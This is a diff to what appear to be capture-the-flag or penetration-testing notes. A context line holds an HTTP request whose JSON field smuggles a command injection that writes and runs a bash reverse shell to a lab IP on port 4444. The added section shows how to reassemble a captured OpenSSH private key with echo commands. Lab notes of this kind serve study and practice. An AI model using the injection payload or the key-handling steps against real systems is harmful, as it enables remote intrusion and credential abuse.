@@ -89,3 +89,15 @@
             Connection: close
 
             {"name":"aaaaa","species":"gopher;echo 'bash -i >& /dev/tcp/10.10.14.68/4444 0>&1' > sh.sh; chmod +x sh.sh;/bin/bash ./sh.sh"}
+### Formating an id_rsa
+   
+     echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa
+     
+  then body 
+  
+    echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvVbhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=" | sed 's/ /\n/g' >> id_rsa
+    
+ Then ending 
+  
+      echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa
+      
